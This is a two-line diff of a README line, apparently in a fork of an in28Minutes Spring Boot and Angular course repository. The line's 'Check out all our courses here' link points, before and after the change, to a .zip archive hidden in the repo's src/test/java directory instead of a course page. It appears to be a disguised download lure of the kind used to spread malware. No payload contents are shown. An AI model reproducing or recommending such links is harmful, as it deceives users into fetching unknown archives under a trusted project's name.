-in28Minutes is creating amazing solutions for you to learn Spring Boot, Full Stack and the Cloud - Docker, Kubernetes, AWS, React, Angular etc. - [Check out all our courses here](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+in28Minutes is creating amazing solutions for you to learn Spring Boot, Full Stack and the Cloud - Docker, Kubernetes, AWS, React, Angular etc. - [Check out all our courses here](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
